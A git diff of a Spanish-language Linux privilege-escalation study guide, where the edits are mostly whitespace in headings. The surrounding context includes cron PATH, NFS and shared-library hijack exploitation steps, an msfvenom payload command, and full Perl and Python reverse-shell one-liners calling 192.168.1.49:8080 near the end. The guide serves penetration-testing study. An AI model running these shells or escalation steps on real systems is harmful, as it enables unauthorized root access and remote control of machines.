@@ -2,7 +2,7 @@
 
 *"Hacking is not about exploits, hacking is using what you have"*
 
-## Objetivo
+## Objetivo
 
 El objetivo de realizar una escalada de privilegios no es otro que obtener una shell de root en el sistema. Para conseguir este fin puede ser tan fácil como usar un exploit de kernel, que el usuario root tenga como password toor o que se necesiten encadenar varios errores de configuración. 
 
@@ -30,7 +30,7 @@ Un sistema Linux tiene tres niveles:
 - Kernel: Core del sistema operativo. Reside en la memoria y le dice a la CPU que ha de hacer. El kernel es un interfaz entre el hardware y cualquier programa en ejecución
 - User space: Los programas que utiliza el usuario final, tales como las "shell" u otras aplicaciones con ventanas. Como es lógico estas aplicaciones necesitan interaccionar con el hardware del sistema, pero no lo hacen directamente, sino a través de las funciones que soporta el kernel.
 
-#### Kernel
+#### Kernel
 
 Principalmente se encarga de 4 tareas:
 
@@ -53,7 +53,7 @@ Asi que en el espacio de usuario:
 - Es donde las aplicaciones de los usuarios son ejecutadas.
 - Tambien es donde se encuentra la libreria GNU C (glibc)
 
-#### Diferencia esencial
+#### Diferencia esencial
 
 El kernel se ejecuta en modo "kernel mode" y tiene acceso "total" al procesador y a la memoria principal. Por lo tanto, es el dueño y señor del sistema. A la area donde solo puede acceder el Kernel se denomina Kernel Space
 
@@ -61,7 +61,7 @@ En cambio, los procesos que se ejecutan en user space se ejecutan de forma "rest
 
 Por lo tanto, si un proceso en user space se pudre, es facil que no tumbes el sistema, simplemente el kernel se hara cargo de ese proceso y lo "limpiara".
 
-#### Glibc
+#### Glibc
 
 Glibc es la librería C  proporciona y define las llamadas al sistema y otras funciones básicas utilizada por casi todos los programas como open, malloc, printf, etc. La librería C es utilizada por todos los programas enlazados dinámicamente. En los sistemas Linux se instala con el nombre de libc6.
 
@@ -198,7 +198,7 @@ En la respuesta el primer caracter indica que es:
 - (-):  file
 - d: directory
 
-### Ficheros /etc/passwd y /etc/shadow
+### Ficheros /etc/passwd y /etc/shadow
 
 #### Fichero /etc/passwd
 
@@ -626,7 +626,7 @@ Realmente, la unica ténica valida es Enumerar, enumerar más y darle vueltas a 
 
 En esta primera fase, se lleva a cabo una enumeración muy básica del terminal y se prueban algunas ideas locas por su simpleza
 
-#### ¿Quién soy, quién hay ahí?
+#### ¿Quién soy, quién hay ahí?
 
 ##### Objetivo
 
@@ -679,7 +679,7 @@ Obtener información muy básica sobre el sistema en que estamos.
 
  - cat /etc/fstab: Definición de las particiones
 
-#### ¿Qué puedo hacer?
+#### ¿Qué puedo hacer?
 
 ##### Objetivo
 
@@ -756,13 +756,13 @@ Una vez se han encontrado algunos exploits con posibilidades de exito, no esta d
 
 En este segunda fase se enumeran aspectos de red y comunicaciones
 
-#### ¿Cuál es la configuración de red de la máquina?
+#### ¿Cuál es la configuración de red de la máquina?
 
-##### Objetivo
+##### Objetivo
 
 Obtener la configuración de red de la máquina
 
-##### Instrucciones
+##### Instrucciones
 
 - ifconfig: Ip de la máquina
 - route -nee: Routing de la máquina
@@ -783,7 +783,7 @@ Conocer que puertos y servicios asociados estan activos
   - Lsoft lista los ficheros abiertos en el sistema. Otros comandos útiles: -p PID, -u Use, -c nombre_proceso, +D directorio/path concreto
 - iptables -L: Listar las reglas de iptables
 
-#### Bala de plata II: NFS
+#### Bala de plata II: NFS
 
 Tal y como se ha comentado antes, NFS no esta "diseñado" para ser seguro per se. En determinadas condiciones, es posible explotar su mala configuración y ser root.
 
@@ -854,11 +854,11 @@ Determinar que servicios se estan ejecutando, comprobar sus permisos y ver si ha
 
 #### ¿Qué información puedo obtener de Cron?
 
-##### Objetivo
+##### Objetivo
 
 Obtener todo la información posible sobre el servicio Cron.
 
-##### Instrucciones
+##### Instrucciones
 
 - crontab -l
 - ls -alh /var/spool/cron
@@ -944,7 +944,7 @@ PATH contiene o indica la ruta a los directorios en los cuales cron buscará el 
 - Una posibilidad es modificar la variable Path del fichero crontab para que busque determinado fichero en una ubicacion concreta
 - Observar si un scrip cron no tiene definido un path absoluto, también puede ser un vector de ataque
 
-##### Explotación
+##### Explotación
 
 1. Compilar un shell file
 2. Colocarlo en una ubicacion del path accesible
@@ -1021,16 +1021,16 @@ Buscar todos los servicios que se estan publicando y ver sus ficheros de configu
 
 Revisar los home del sistema por si hay cosas interesantes
 
-##### Instrucciones
+##### Instrucciones
 
 Listar de forma recursiva /home y /root:
 
 - ls -ahlR /root/
 - ls -ahlR /home/
 
-#### ¿Qué sabemos de SSH?
+#### ¿Qué sabemos de SSH?
 
-##### Objetivo
+##### Objetivo
 
 Conseguir claves de conexión de SSH. Las claves SSH son la alternativa a los passwords SSH, siempre van en pareja y si no estan bien protegidas seria posible utilizarlas.
 
@@ -1163,7 +1163,7 @@ El código es el siguiente:
 #include <stdio.h>
 #include <stdlib.h>
 
-static void foo() __attribute__((constructor));
+static void foo() \__attribute__((constructor));
 
 void foo() 
 
@@ -1275,7 +1275,7 @@ Pero, ¿que pasaria si algunos de estos objetos no se cargan, porque no estan, p
 
 _strace <executable_file> 2>&1 | grep -i -E "open|access| no such file"_
 
-###### Explotación
+###### Explotación
 
 1. Compilar un fichero .so
 2. Renombrarlo y utilizarlo en la localización identificada donde no hay fichero
@@ -1432,7 +1432,7 @@ Este argumento lo que hace es permitir al usuario definir una accion que ejecuta
 
 - Copiar el fichero /bin/bash con el SUID root set y ejecutar con -p
 
-#### Metasploit
+#### Metasploit
 
 - msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
 - netcat + multihandlers (metasploit)
@@ -1449,7 +1449,7 @@ Este argumento lo que hace es permitir al usuario definir una accion que ejecuta
 
 - perl -e ‘use Socket;$i=”192.168.1.49″;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
 
-#### Python
+#### Python
 
 - python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.49”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 
